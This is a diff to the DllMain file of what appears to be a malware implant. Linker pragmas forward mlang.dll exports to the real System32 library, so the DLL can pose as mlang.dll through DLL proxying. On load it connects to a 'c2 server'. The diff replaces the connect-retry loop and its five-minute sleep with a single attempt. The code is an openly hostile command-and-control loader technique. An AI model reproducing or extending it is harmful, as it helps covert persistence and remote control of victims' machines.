@@ -1,8 +1,7 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "ProcessManager.h"
 #include "Client.h"
-#include "NetworkCommon.h"
-
+#include <memory>
 
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
@@ -38,12 +37,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         std::unique_ptr<Client> me = std::make_unique<Client>();
         BOOL connected = FALSE;
 
-        do {
+        //do {
             // try to connect to c2 server
-            connected = me->Connect();
-            connectionAttempts++;
-            Sleep(300000); // second interval before connecting again
-        } while ( connected == FALSE && connectionAttempts < MAX_CON_ATTEMPTS );
+        connected = me->Connect();
+            //connectionAttempts++;
+            //Sleep(300000); // second interval before connecting again
+        //} while ( connected == FALSE && connectionAttempts < MAX_CON_ATTEMPTS );
 
         // failed.
         if ( connected == FALSE && connectionAttempts >= MAX_CON_ATTEMPTS )
